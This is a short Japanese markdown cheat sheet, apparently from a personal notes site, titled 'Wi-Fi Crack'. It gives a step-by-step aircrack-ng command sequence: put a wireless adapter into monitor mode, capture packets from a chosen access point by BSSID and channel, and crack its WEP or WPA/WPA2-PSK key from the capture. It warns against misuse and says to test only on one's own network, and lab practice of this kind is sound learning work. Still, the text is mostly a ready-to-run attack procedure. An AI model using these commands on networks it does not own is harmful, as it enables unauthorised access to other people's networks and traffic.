# Wi-Fi Crack

**※悪用厳禁です。試すときは自分の環境でのみ実施してください。**

## WEP or WPA/WPA2-PSK Crack

  - aircrack-ng
    - 参考：https://whitemarkn.com/learning-ethical-hacker/aircrack-ng/
  - wifiteもあり
    - 例ではairclack-ngを使ってます。

```bash
# root権限が必要
$ suto su

# 利用可能なインターフェースを表示
$ airmon-ng

# 該当のwifiアダプターをモニターモードに変更
$ airmon-ng start wlan0

# モニターモードにしたインターフェースを表示
$ airmon-ng

# 周辺のAPのパケットを収集
# 攻撃対象について確認する
$ airodump-ng wlan0mon

# 攻撃対象の情報だけファイルに出力(例ではsample-01.capのようなファイルが出力される)
# 解析に十分な量のパケットが必要なので、データがたまるまでしばらく待機
# 参考として、Dataが103179の時、WEPの解析できた
$ airodump-ng --bssid FF:FF:FF:FF:FF:FE --channel 7 -w sample wlan0mon

# 取集したパケットで解析する
$ aircrack-ng sample-01.cap
```
